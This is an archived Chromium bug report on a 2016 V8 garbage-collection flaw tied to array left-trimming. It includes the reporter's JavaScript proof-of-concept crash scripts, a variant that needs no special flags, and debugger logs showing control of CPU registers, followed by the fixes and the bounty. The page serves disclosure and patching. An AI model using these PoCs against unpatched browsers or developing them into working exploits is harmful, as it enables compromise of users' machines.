# Security: V8 OOB Read(?) in GC with Array Object.

| Field | Value |
|-------|-------|
| **Issue ID** | [40084579](https://issues.chromium.org/issues/40084579) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | sj...@gmail.com |
| **Assignee** | ml...@chromium.org |
| **Created** | 2016-06-16 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS** .  

i think that bug is in "gc();" methods.

I was try to detail analysis this case, but already have (fixed or wontfix) issue on crbug.com. :-(

i just try to control regiters.

i attached to more detail V8 Crash logs in zip file. (change "RIP" register in V8 5.2.0)

**VERSION**  

Chrome Version: 51.0.2704.84 m + stable 32/64bit  

Operating System: Windows 10 Pro 64bit

# **REPRODUCTION CASE** when reproduce this case, use "--expose-gc" flags in V8, Chrome.

var o0 = [];  

var o1 = [];  

var o2 = [];

o1.**defineGetter**(0, function() {  

o0.shift();  

gc(); //crash here.  

o0.concat(o1);  

});

# o0.length = 24; o1[0];

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: V8 in renderer tab  

Crash State:  

============================================= 32bit case =================================================================  

(115c.19f0): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for c:\Program Files (x86)\Google\Chrome\Application\51.0.2704.84\chrome\_child.dll -  

chrome\_child!ChromeMain+0x4ad8f0:  

65dc157d 0fb64007 movzx eax,byte ptr [eax+7] ds:002b:4646464d=??  

3:033:x86> r  

eax=46464646 ebx=00636130 ecx=37d09155 edx=00636130 esi=00668d88 edi=00000000  

^^^^^^^^ ; o0.push(0x23232323); controll eax register.  

eip=65dc157d esp=0018b0b0 ebp=0018b0cc iopl=0 nv up ei pl nz na po nc  

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202  

chrome\_child!ChromeMain+0x4ad8f0:  

65dc157d 0fb64007 movzx eax,byte ptr [eax+7] ds:002b:4646464d=??  

3:033:x86> kbn

# ChildEBP RetAddr Args to Child

WARNING: Stack unwind information not available. Following frames may be wrong.  

00 0018b0cc 65dc13e6 37d09155 00000001 00668d8c chrome\_child!ChromeMain+0x4ad8f0  

01 0018b0ec 667ffe6f 0018b1f8 00668d88 00000001 chrome\_child!ChromeMain+0x4ad759  

02 0018b12c 667f7fe3 0018b1f8 0018b170 65dc1091 chrome\_child!GetHandleVerifier+0x80c3ed  

03 0018b138 65dc1091 0018b16c 0018b1f8 00636120 chrome\_child!GetHandleVerifier+0x804561  

04 0018b170 65dc0fb7 00000006 0018b1f8 00000006 chrome\_child!ChromeMain+0x4ad404  

05 0018b1b8 3270a7fe 00000006 0018b1f8 00636120 chrome\_child!ChromeMain+0x4ad32a  

06 0018b1dc 327391b9 0000000a 00000008 00000006 0x3270a7fe  

07 0018b208 3273283e 0781edb1 0781edd1 327327a1 0x327391b9  

08 0018b220 32721943 00000000 0018b774 00000000 0x3273283e  

09 0018b24c 65b9ed12 3a90818d 0781edd1 0781edb1 0x32721943  

0a 0018b2a0 65b9ec2c 00000000 00668d80 00668d78 chrome\_child!ChromeMain+0x28b085  

0b 0018b2e0 65bc9d36 00668d80 00668d78 00000000 chrome\_child!ChromeMain+0x28af9f  

0c 0018b300 65bb8692 00668d78 00668d80 0018b3c4 chrome\_child!ChromeMain+0x2b60a9  

0d 0018b380 65b7e3d5 00636120 00000000 00000001 chrome\_child!ChromeMain+0x2a4a05  

0e 0018b3b0 667d60ef 00000001 0781edb1 00636120 chrome\_child!ChromeMain+0x26a748  

0f 0018b410 667d623e 00668d78 0018b614 00668d78 chrome\_child!GetHandleVerifier+0x7e266d  

10 0018b5c4 667d74c1 00668d78 3a96c6d9 00668d50 chrome\_child!GetHandleVerifier+0x7e27bc  

11 0018b67c 65c47e39 00668d50 00636120 00000002 chrome\_child!GetHandleVerifier+0x7e3a3f  

12 0018b6c8 65c47b91 00000002 0018b740 00000002 chrome\_child!ChromeMain+0x3341ac  

13 0018b710 3270a7fe 00000002 0018b740 00636120 chrome\_child!ChromeMain+0x333f04  

....  

[skip, skip, skip]  

....  

76 0018dc2c 3273c619 0781edb1 3a96ce6d 3a90818d 0x3270a7fe  

77 0018dc48 3273283e 07808145 24d29661 327327a1 0x3273c619  

78 0018dc60 32721943 00000000 00000000 00000002 0x3273283e  

79 0018dc8c 65b9ed12 3a90818d 24d29661 37d08145 0x32721943  

7a 0018dce0 65b9ec2c 00000000 00668af0 00668b18 chrome\_child!ChromeMain+0x28b085  

7b 0018dd20 65c1c8f2 00668af0 00668b18 00000000 chrome\_child!ChromeMain+0x28af9f  

7c 0018dd88 65c1c488 0018ddc4 00668b10 48c21948 chrome\_child!ChromeMain+0x308c65  

7d 0018ddf0 65c1abc2 00668af0 035a2158 48c21948 chrome\_child!ChromeMain+0x3087fb  

7e 0018de84 65b6bb24 0018deac 00668ab8 0018e00c chrome\_child!ChromeMain+0x306f35  

7f 0018ded0 65b6ba02 0018df0c 0018e00c 00000001 chrome\_child!ChromeMain+0x257e97  

80 0018defc 65c9a76e 0018e00c 00000001 00000000 chrome\_child!ChromeMain+0x257d75  

81 0018df80 65c962f3 0018e00c 0018dfa8 3ce2f410 chrome\_child!ChromeMain+0x386ae1  

82 0018e0c0 65c95acd 0018e284 00000000 3ce2f410 chrome\_child!ChromeMain+0x382666  

83 0018e1f0 65c959b8 3ce2ff10 0018e284 59340120 chrome\_child!ChromeMain+0x381e40  

84 0018e230 65c72603 035a2958 0018e284 00000000 chrome\_child!ChromeMain+0x381d2b  

85 0018e734 65c71e2c 00000000 59219160 59208958 chrome\_child!ChromeMain+0x35e976  

86 0018e838 65a7172a 0018e908 006ad688 68337a6b chrome\_child!ChromeMain+0x35e19f  

87 0018e850 65a6cb0e 59208b38 00000000 59208b38 chrome\_child!ChromeMain+0x15da9d  

88 0018e864 6593fc7b 006ad688 005cf3f8 005f0c40 chrome\_child!ChromeMain+0x158e81  

89 0018e8cc 659c1950 67a95010 0018e908 005cf3f8 chrome\_child!ChromeMain+0x2bfee  

8a 0018e97c 659c0b5a 034e3800 0018ea58 005eb598 chrome\_child!ChromeMain+0xadcc3  

8b 0018eaa8 659c0a2b 00000000 00000000 00000000 chrome\_child!ChromeMain+0xacecd  

8c 0018eabc 659c09ea 659c0a34 005f0d10 005cf3f8 chrome\_child!ChromeMain+0xacd9e  

8d 0018eae4 6593fc7b 005eb578 68337a60 00680ec8 chrome\_child!ChromeMain+0xacd5d  

8e 0018eb48 6593f8c7 67a5e714 0018f6d8 ffffffff chrome\_child!ChromeMain+0x2bfee  

8f 0018f6b4 6593f555 0018f6d8 005fe900 005fe8f0 chrome\_child!ChromeMain+0x2bc3a  

90 0018f7c0 65941d40 0018f828 005d4b60 67a5c4a0 chrome\_child!ChromeMain+0x2b8c8  

91 0018f7ec 6593ef65 005d4b60 00000000 67a91b20 chrome\_child!ChromeMain+0x2e0b3  

92 0018f818 6593eea6 67a5c4a0 00000000 005d4b60 chrome\_child!ChromeMain+0x2b2d8  

93 0018f844 65963cc0 005eb200 00000003 005cf820 chrome\_child!ChromeMain+0x2b219  

94 0018f93c 6593204d 0018f974 005f7020 00000000 chrome\_child!ChromeMain+0x50033  

95 0018f950 6592dfb9 0018f988 0018f974 0018f9cc chrome\_child!ChromeMain+0x1e3c0  

96 0018f9a4 65913f9c 00000000 005cb5d8 0018f9f8 chrome\_child!ChromeMain+0x1a32c  

97 0018f9b4 65913cee 0018f9e8 00e21c7f 005ca498 chrome\_child!ChromeMain+0x30f  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for chrome.exe -  

98 0018f9f8 00e1fcd7 00df0000 0018fa14 00df0000 chrome\_child!ChromeMain+0x61  

99 0018fa90 00e1f3b7 00df0000 00000000 00eae418 chrome!GetUploadedReportsImpl+0xad8  

9a 0018fbc8 00e49976 00df0000 00000000 005b1db0 chrome!GetUploadedReportsImpl+0x1b8  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\WINDOWS\SysWOW64\KERNEL32.DLL -  

9b 0018fc14 746638f4 003d7000 746638d0 74731201 chrome!IsSandboxedProcess+0x2167d  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for ntdll.dll -  

9c 0018fc28 77565de3 003d7000 a5655cff 00000000 KERNEL32!BaseThreadInitThunk+0x24  

9d 0018fc70 77565dae ffffffff 7758b7c6 00000000 ntdll\_77500000!RtlUnicodeStringToInteger+0x253  

9e 0018fc80 00000000 00e499ef 003d7000 00000000 ntdll\_77500000!RtlUnicodeStringToInteger+0x21e

=================================== 64 bit case =======================================================  

(1f24.1868): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for c:\Program Files (x86)\Google\Chrome\Application\51.0.2704.84\chrome\_child.dll -  

chrome\_child!GetHandleVerifier+0x29b644:  

00007ffb`2bc20994 0fb64207 movzx eax,byte ptr [rdx+7] ds:20150303`00000007=??  

3:033> r  

rax=000001f137d56660 rbx=2015030300000000 rcx=000001548e2062b1  

rdx=2015030300000000 rsi=000001548e2062b1 rdi=0000000020150302 ; rdx controll, high 4 address of rdx.  

rip=00007ffb2bc20994 rsp=00000024559d6ca0 rbp=0000000000000001  

r8=00000000fffffff8 r9=0000000000000000 r10=000001548e200000  

r11=000001f137cf5be0 r12=000001f137d1f170 r13=000001548e2062a9  

r14=00000024559d6e80 r15=00000000fffffff8  

iopl=0 nv up ei pl nz na po nc  

cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206  

chrome\_child!GetHandleVerifier+0x29b644:  

00007ffb`2bc20994 0fb64207 movzx eax,byte ptr [rdx+7] ds:20150303`00000007=??  

3:033> kbn

# RetAddr : Args to Child : Call Site

00 00007ffb`2c809f4d : 20150303`00000000 20150303`00000000 20150303`00000000 00000024`559d6ea0 : chrome_child!GetHandleVerifier+0x29b644 01 00007ffb`2c7a6424 : 000001f1`37d58af0 000001f1`37d1f170 000001f1`37d1f150 00007ffb`2db347b4 : chrome\_child!GetHandleVerifier+0xe84bfd  

02 00007ffb`2c7a57ea : 000001f1`37d1f170 00000024`559d6fe8 000001f1`37d1f150 00000000`00000100 : chrome_child!GetHandleVerifier+0xe210d4 03 00007ffb`2c7967ca : 00000024`559d6e80 00000024`559d6fe8 000001f1`37d5a530 00000024`559d6ef0 : chrome\_child!GetHandleVerifier+0xe2049a  

04 00007ffb`2c741e09 : 00000024`559d6fe8 00007ffb`2ed71678 00000000`00000004 00000024`559d6e00 : chrome_child!GetHandleVerifier+0xe1147a 05 00007ffb`2c741c99 : 000001f1`37d0d780 00007ffb`2b9b525e 00000000`00000000 00000000`00000000 : chrome\_child!GetHandleVerifier+0xdbcab9  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for ntdll.dll -  

06 00000335`5ff092ab : 000002d7`4e1af8e1 000002d7`4e1b1e09 000001e1`8cb30db9 00000000`00000006 : chrome_child!GetHandleVerifier+0xdbc949 07 000002d7`4e1af8e1 : 000002d7`4e1b1e09 000001e1`8cb30db9 00000000`00000006 00000024`559d6f88 : 0x00000335`5ff092ab 08 000002d7`4e1b1e09 : 000001e1`8cb30db9 00000000`00000006 00000024`559d6f88 00000000`00000000 : 0x000002d7`4e1af8e1 09 000001e1`8cb30db9 : 00000000`00000006 00000024`559d6f88 00000000`00000000 3e24bdbf`45544690 : 0x000002d7`4e1b1e09 0a 00000000`00000006 : 00000024`559d6f88 00000000`00000000 3e24bdbf`45544690 00000335`5ff091e1 : 0x000001e1`8cb30db9 0b 00000024`559d6f88 : 00000000`00000000 3e24bdbf`45544690 00000335`5ff091e1 00000024`559d6f60 : 0x6  

0c 00000000`00000000 : 3e24bdbf`45544690 00000335`5ff091e1 00000024`559d6f60 00000003`00000000 : 0x00000024`559d6f88

## Attachments

- [singi160616.zip](attachments/singi160616.zip) (application/octet-stream, 7.2 KB)

## Timeline

### sj...@gmail.com (2016-06-16)

==================================
//controll eax register
<script>
var o0 = [];
var o1 = [];
var o2 = [];
var count = 0;

o1.__defineGetter__(0, function() {
	o0.shift(1,2,3,4,5);
	for(i=0;i<100;i++)
		o0.push(0x23232323);
	gc();
	o0.concat(o1);
});

o0.length = 21;
//gc();
o1.concat(o0);

</script>
==================================

### cl...@chromium.org (2016-06-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6630088057815040

### cl...@chromium.org (2016-06-16)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6630088057815040

Uploader: estark@google.com
Job Type: windows_asan_chrome
Platform Id: windows

Crash Type: CHECK failure
Crash Address: 
Crash State:
  Marking::IsBlack(Marking::MarkBitFrom(object)) in mark-compact.cc
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=400154:400170

Minimized Testcase (0.18 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv963ZhrM9DnnfjUpoaBPSLG8r2NQdobiQBw2IOSydeDwSNDSMfFdu9nA3v3VgGB7ajxQ9m-MZijRKH3QhbwIgFkPQ5ROwWMeeY2fIlqx5Mmpl6Az0Y6ufFrRZm2fACRh6BOM8EkiLM-Flk1ZyeJuoBw4nzqFTQ
<script>
var o0 = [];
var o1 = [];
o1.__defineGetter__(0, function() {
	o0.shift();
	for(i=0;i<100;i++)
		o0.push(0x23232323);
	gc();
	o0.concat(o1);
});
o1.concat();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2016-06-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-17)

ClusterFuzz has detected this testcase as flaky and is unable to reproduce it in the original crash revision. Skipping fixed testing check and marking it as potentially fixed.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6630088057815040

Uploader: estark@google.com
Job Type: windows_asan_chrome
Platform Id: windows

Crash Type: CHECK failure
Crash Address: 
Crash State:
  Marking::IsBlack(Marking::MarkBitFrom(object)) in mark-compact.cc
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=windows_asan_chrome&range=400154:400170

Minimized Testcase (0.18 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv963ZhrM9DnnfjUpoaBPSLG8r2NQdobiQBw2IOSydeDwSNDSMfFdu9nA3v3VgGB7ajxQ9m-MZijRKH3QhbwIgFkPQ5ROwWMeeY2fIlqx5Mmpl6Az0Y6ufFrRZm2fACRh6BOM8EkiLM-Flk1ZyeJuoBw4nzqFTQ?testcase_id=6630088057815040
<script>
var o0 = [];
var o1 = [];
o1.__defineGetter__(0, function() {
	o0.shift();
	for(i=0;i<100;i++)
		o0.push(0x23232323);
	gc();
	o0.concat(o1);
});
o1.concat();
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### sj...@gmail.com (2016-06-18)

i check again in my system. (stable chrome latest version. )

still alive this bug. :D

### aa...@google.com (2016-06-18)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### ja...@chromium.org (2016-06-18)

Bisects to:

commit 493aa2311e84e0b8bb0254ea52530cc17983da9b
Author: mlippautz <mlippautz@chromium.org>
Date:   Fri Jan 8 00:33:48 2016 -0800

    Re-enable left trimming.
    
    LOG=N
    BUG=v8:4606
    R=hpayer@chromium.org
    
    Review URL: https://codereview.chromium.org/1572513002
    
    Cr-Commit-Position: refs/heads/master@{#33168}

Using the following repro with --expose-gc:  (the repro can be easily made to run in bounded stack by adding a counter to the getter and returning for counter > 2)

var o0 = [];
var o1 = [];
o1.__defineGetter__(0, function() {
  o0.shift();
  gc();
  o0.push(0);
  o0.concat(o1);
});
o1[0];

### ml...@chromium.org (2016-06-20)

[Empty comment from Monorail migration]

### ml...@chromium.org (2016-06-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-06-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/d800a65967b115c6e1aa6c3ba08861a304383088

commit d800a65967b115c6e1aa6c3ba08861a304383088
Author: mlippautz <mlippautz@chromium.org>
Date: Mon Jun 20 14:29:54 2016

[heap] Filter out stale left-trimmed handles

BUG=chromium:620553
LOG=N
R=jochen@chromium.org

Review-Url: https://codereview.chromium.org/2078403002
Cr-Commit-Position: refs/heads/master@{#37108}

[modify] https://crrev.com/d800a65967b115c6e1aa6c3ba08861a304383088/src/heap/heap.cc
[modify] https://crrev.com/d800a65967b115c6e1aa6c3ba08861a304383088/src/heap/heap.h
[modify] https://crrev.com/d800a65967b115c6e1aa6c3ba08861a304383088/src/heap/mark-compact.cc
[add] https://crrev.com/d800a65967b115c6e1aa6c3ba08861a304383088/test/mjsunit/regress/regress-620553.js


### es...@chromium.org (2016-06-20)

[Empty comment from Monorail migration]

### es...@chromium.org (2016-06-20)

[Empty comment from Monorail migration]

### es...@chromium.org (2016-06-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-21)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5617960291139584

Fuzzer: mbarbella_js_mutation
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  Marking::IsBlack(Marking::MarkBitFrom(object)) in mark-compact.cc
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_d8&range=33207:33208

Minimized Testcase (0.14 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96QqD2XG5hT7Y11IxaVa-02Q9JAVjt6pSFbXXFA0Tx2yNKo5amnIS4uiTdqMqm36mjtu5LC7Vh_2t4YprOZ6Fr7SO2WWxnsBNdRldvjbYmfxedt3MFBVm2ybeqmIL79WpArT7VkvbMLT48DI157gTJTwemttQ?testcase_id=5617960291139584
__v_2 = [];
__v_1 = [];
__v_1.__defineGetter__(0, function() {
  __v_2.shift();
  gc();
  __v_2.push(0);
  __v_2.concat(__v_1);
});
__v_1[0];


Filer: ishell

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### ml...@chromium.org (2016-06-21)

#15 uses an old revision. The fix from #11 also fixes this one.

### sj...@gmail.com (2016-06-21)

aha! :]

### sh...@chromium.org (2016-06-21)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-21)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Request-XX label, where XX is the Chrome milestone.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-06-22)

ClusterFuzz has detected this issue as fixed in range 37107:37108.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5617960291139584

Fuzzer: mbarbella_js_mutation
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  Marking::IsBlack(Marking::MarkBitFrom(object)) in mark-compact.cc
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_d8&range=33207:33208
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_d8&range=37107:37108

Minimized Testcase (0.14 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96QqD2XG5hT7Y11IxaVa-02Q9JAVjt6pSFbXXFA0Tx2yNKo5amnIS4uiTdqMqm36mjtu5LC7Vh_2t4YprOZ6Fr7SO2WWxnsBNdRldvjbYmfxedt3MFBVm2ybeqmIL79WpArT7VkvbMLT48DI157gTJTwemttQ?testcase_id=5617960291139584
__v_2 = [];
__v_1 = [];
__v_1.__defineGetter__(0, function() {
  __v_2.shift();
  gc();
  __v_2.push(0);
  __v_2.concat(__v_1);
});
__v_1[0];


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### sh...@chromium.org (2016-06-23)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-06-23)

Before we approve merge to M52, Could you please confirm whether this change is baked/verified in Canary and safe to merge?



### go...@chromium.org (2016-06-23)

And this change is for all os or any specific OS?

### ml...@chromium.org (2016-06-23)

All OS, needs to be merged with 7a88ff3cc096ecd681e9d10ad0a75c7d3daf027e.

Ideally, they would get a bit more Canary time though.

### go...@chromium.org (2016-06-27)

Ok, please update the bug once it is well baked in canary/dev.

### ti...@google.com (2016-06-27)

[Automated comment] There appears to be on-going work (i.e. bugroid changes), needs manual review.

### ml...@chromium.org (2016-06-28)

Seems fine on last couple Canaries.

I would like to merge 
  d800a65967b115c6e1aa6c3ba08861a304383088 and
  7a88ff3cc096ecd681e9d10ad0a75c7d3daf027e

### go...@chromium.org (2016-06-28)

Approving merge to M52 branch 2743 based on https://crbug.com/chromium/620553#c27. Please merge before 1:00 PM PST tomorrow (Wedenesday, June 29th) so we can take it for this week beta release. Thank you

### go...@chromium.org (2016-06-28)

[Empty comment from Monorail migration]

### ml...@chromium.org (2016-06-28)

Won't make it till then as we discussed offline that we would like to move the calls to another place. Logic will stay the same.

### sj...@gmail.com (2016-06-29)

without --expose-gc flags PoC like that.
function gc() {
  tmp = [];
  for (var i = 0; i < 0x100000; i++)
    tmp.push(new Uint8Array(10));
  tmp = null;
}

var o0 = [];
var o1 = [];
var o2 = [];

o1.__defineGetter__(0, function() {
  o0.shift();
  gc();
  o0.concat(o1);
});

o0.length = 24;
o1[0];

### bu...@chromium.org (2016-06-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/a7159577b7d092ef6283c51f8bb2c456b0e23a38

commit a7159577b7d092ef6283c51f8bb2c456b0e23a38
Author: mlippautz <mlippautz@chromium.org>
Date: Wed Jun 29 08:16:07 2016

[heap] Iterate handles with special left-trim visitor

BUG=chromium:620553
LOG=N
R=hpayer@chromium.org

Review-Url: https://codereview.chromium.org/2102243002
Cr-Commit-Position: refs/heads/master@{#37366}

[modify] https://crrev.com/a7159577b7d092ef6283c51f8bb2c456b0e23a38/src/heap/heap-inl.h
[modify] https://crrev.com/a7159577b7d092ef6283c51f8bb2c456b0e23a38/src/heap/heap.cc
[modify] https://crrev.com/a7159577b7d092ef6283c51f8bb2c456b0e23a38/src/heap/heap.h
[modify] https://crrev.com/a7159577b7d092ef6283c51f8bb2c456b0e23a38/src/heap/mark-compact.cc
[modify] https://crrev.com/a7159577b7d092ef6283c51f8bb2c456b0e23a38/src/heap/scavenger.cc


### ml...@chromium.org (2016-06-30)

As expect, the refactoring is also fine on Canary, preparing the backmerge.

### bu...@chromium.org (2016-06-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f

commit b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f
Author: mlippautz <mlippautz@chromium.org>
Date: Thu Jun 30 12:50:19 2016

Version 5.2.361.32 (cherry-pick)

Merged d800a65967b115c6e1aa6c3ba08861a304383088
Merged 7a88ff3cc096ecd681e9d10ad0a75c7d3daf027e
Merged a7159577b7d092ef6283c51f8bb2c456b0e23a38

[heap] Filter out stale left-trimmed handles
[heap] Filter out stale left-trimmed handles for scavenges
[heap] Iterate handles with special left-trim visitor

BUG=chromium:620553,chromium:620553,chromium:621869
LOG=N
R=hablich@chromium.org, hpayer@chromium.org
NOTRY=true
NOPRESUBMIT=true

Review-Url: https://codereview.chromium.org/2111133002
Cr-Commit-Position: refs/branch-heads/5.2@{#38}
Cr-Branched-From: 2cd36d6d0439ddfbe84cd90e112dced85084ec95-refs/heads/5.2.361@{#1}
Cr-Branched-From: 3fef34e02388e07d46067c516320f1ff12304c8e-refs/heads/master@{#36332}

[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/include/v8-version.h
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/heap/heap.cc
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/heap/heap.h
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/heap/mark-compact.cc
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/heap/scavenger.cc
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/objects-inl.h
[modify] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/src/objects.h
[add] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/test/mjsunit/regress/regress-620553.js
[add] https://crrev.com/b4b9377b674f84d21c12e1d6986c5b1ecffb7b3f/test/mjsunit/regress/regress-621869.js


### sh...@chromium.org (2016-07-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ml...@chromium.org (2016-07-04)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-07-05)

[Empty comment from Monorail migration]

### sj...@gmail.com (2016-07-06)

Hi!

can i get any reward on this issue?



### ml...@chromium.org (2016-07-07)

+timwillis

### aw...@chromium.org (2016-07-14)

awhalley is the new timwillis!

Just added reward-topanel, and is in the queue for the panel to look at.

Thanks for the report!

### aw...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

Congratulations! Our panel has awarded $5,000 for this bug.  A member of our finance team will be in touch over the next few weeks.

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### sj...@gmail.com (2016-07-25)

thanks :)

### aw...@chromium.org (2016-08-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/620553?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/620749, crbug.com/chromium/621274, crbug.com/chromium/621810]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084579)*
